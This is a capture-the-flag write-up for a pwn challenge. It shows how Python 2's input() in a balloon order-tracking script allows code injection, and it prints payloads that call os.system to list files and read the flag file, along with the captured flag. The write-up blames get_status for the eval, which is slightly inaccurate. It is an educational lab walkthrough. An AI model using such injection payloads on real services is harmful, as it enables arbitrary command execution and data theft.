
## Challenge 

**Category:**  pwn

Starting off with a bag (pop)! I ordered a bunch of Valentine's Day-themed balloons, and I'm so excited about them! Here's the portal I use to track my order.
Look for "valentine.txt"
**Author:** Manav (0xmmalik)
`nc 0.cloud.chals.io 34293`

## Information

We are given balloons.py and told to look for 'valentine.txt', the script is running on a server so we netcat into the chall.
ballons.py: 
```python
from balloon_tracking_lookup import get_status

print "Welcome to your balloon order-tracking portal! Enter your tracking number here.\n"
tracking_number = input(">>> ")

try:
  print "Getting status for order #" + str(int(tracking_number)) + "..."
except:
  print "Invalid tracking number!"

print get_status(int(tracking_number))
```
## Thought Process 

First thing I noticed was that its written in python2.
Next, i see its importing another script 'get_status' from 'balloon_tracking_lookup'
```python
from balloon_tracking_lookup import get_status
```
looking further, its expecting us to input a string and assign it to variable "tracking_number"
```python
tracking_number = input(">>> ")
```
then, we get pushed into a try: except: in which the string is converted into an int, if python is unable to convert that string into an int, we get "Invalid tracking number!"
but, if all is well and no errors occur, "tracking_number" gets passed to get_status(), type casted into an int. 

Lets see if we can make the script behave in an unexpected way. 
```shell
jacob@ubuntu:~$  nc 0.cloud.chals.io 34293 

Welcome to your balloon order-tracking portal! Enter your tracking number here.
1

>>> Getting status for order #1...

Tracking number not found!
```

More or less expected, we passed the number 1 as a string, which was type casted into an int and passed to get_status() we can confirm that it was passed to get_status because the message we receive 
```shell
Tracking number not found!
```
Is not present in the 'ballons.py' script that we get to look at so we know thats coming from get_status.

Ok, now lets pass something unexpected.
```shell
jacob@ubuntu:~$ nc 0.cloud.chals.io 34293

Welcome to your balloon order-tracking portal! Enter your tracking number here.
something unexpected

>>> 
jacob@ubuntu:~$
```

Interesting, we aren't given any output.
Now lets try to get funky, can we type cast and throw an error? 
```shell
jacob@ubuntu:~$ nc 0.cloud.chals.io 34293

Welcome to your balloon order-tracking portal! Enter your tracking number here.
str("something funky")

>>> Invalid tracking number!
```
Now we know it's throwing an exception because we are given the expected output for that logic.
The question now is, can we force it to be passed to get_status anyway? lets try treating it as a variable instead of putting it in quotes.
```shell
jacob@ubuntu:~$ nc 0.cloud.chals.io 34293

Welcome to your balloon order-tracking portal! Enter your tracking number here.
str(funky)

>>> 
jacob@ubuntu:~$ 
```
alright! now it's beeing evaluated by get_status, can we make it perform logic? 

```shell
jacob@ubuntu:~$ nc 0.cloud.chals.io 34293

Welcome to your balloon order-tracking portal! Enter your tracking number here.

str(42+42)

>>> Getting status for order #84...

Tracking number not found!
```
Whoops, looks like get_status is using the dangerous eval() function to check the numbers. We should be able to force it to execute our own arbitrary code.

## Solution

Because eval() is being used, we can force it to import os and execute shell commands. These are the things i tried until i found one that worked
```python

("__import__('os').system('ls')")

(import('os').system('ls'))

"__import__('os').system('ls')"

"__import__('os').system('ls')"

(__import__('os').system('ls'))

```

The working command:
```shell
jacob@ubuntu:~$ nc 0.cloud.chals.io 34293

Welcome to your balloon order-tracking portal! Enter your tracking number here.

(__import__('os').system('ls'))

Dockerfile
balloon_tracking_lookup.py
balloon_tracking_lookup.pyc
balloons.py
start.sh
valentine.txt

>>> Getting status for order #0...

Tracking number not found!
```
As you can see, we listed the files in the current directory. To dump the flag we just have to cat valentine.txt
```shell
jacob@ubuntu:~$ nc 0.cloud.chals.io 34293

Welcome to your balloon order-tracking portal! Enter your tracking number here.

(__import__('os').system('cat valentine.txt'))

valentine{0ops_i_go7_hydrog3n_ball00n5_NONOWHEREAREYOUGOINGWITHTHATLIGHTER}>>> Getting status for order #0...

Tracking number not found!
```

## Flag

```
valentine{0ops_i_go7_hydrog3n_ball00n5_NONOWHEREAREYOUGOINGWITHTHATLIGHTER}
```
